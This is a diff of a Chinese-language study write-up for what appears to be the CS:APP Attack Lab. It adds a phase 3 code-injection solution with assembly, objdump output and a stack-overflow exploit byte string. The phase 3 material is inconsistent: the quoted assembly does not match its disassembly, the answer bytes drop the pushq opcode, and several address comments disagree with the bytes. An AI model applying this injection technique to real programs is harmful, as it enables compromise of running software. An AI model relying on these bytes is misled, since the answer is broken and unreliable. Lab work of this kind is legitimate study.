@@ -38,24 +38,23 @@ phase1_ans.txt:
 思路关键：在getbuf中给%rdi赋值cookie.txt中的0x59b997fa
 
 ```cpp
-// in 1.s
+// in phase2.s
 movq $0x59b997fa,%rdi
 pushq  $0x4017ec
 ret
 
-gcc -c 1.s -o 1.o 
-objdump -d 1.o >2.txt 
+gcc -c phase2.s -o phase2.o 
+objdump -d phase2.o >phase2.txt 
 
-// in 2.txt
+// in phase2.txt
 
-2.o：     文件格式 elf64-x86-64
+phase2.o：     文件格式 elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
    0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
    9:	68 ec 17 40 00       	pushq  $0x4017ec
    e:	c3                   	retq   
-// in 1.s
 ```
 因此，结合phase1进行缓存区溢出，即溢出区域地址返回到想要插入的%rsp地址，观察getbuf函数的代码，可知应在mov %rsp,%rdi后加入攻击代码，即<Gets>之前
 
@@ -88,3 +87,53 @@ ec 17 40 c3 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
+
+## Phase3
+
+![](../imgs/微信截图_20240624163459.png) 
+
+man ascii,
+
+cookie: 59b997fa
+
+str -> Hex: 
+
+35 39 62 39 39 37 66 61
+
+<test> -> $rsp: 0x5561dca8, 我们将字符串放在这里，保证getbuf里面的函数不覆盖字符串
+
+disas touch3 -> touch3跳转地址为：0x4018fa
+
+````
+vim phase3.txt：
+
+```
+movq $0x59b997fa,%rdi
+
+pushq  $0x4017ec
+
+ret
+```
+
+gcc -c phase3.s -o phase3.o 
+objdump -d phase3.o >phase3.txt 
+
+phase3.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq   
+````
+
+因此注入代码答案为：
+
+48 c7 c7 a8 dc 61 55 00 //0x5561dc78, 注入代码，将字符串赋值给$rdi
+fa 18 40 00 c3 00 00 00 // pushq $0x4018fa, 赋值%rsp，跳转touch3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 //0x5561dca0, 跳转到<Get>前
+35 39 62 39 39 37 66 61 //0x5561dca8, 存储的字符串hex码
+
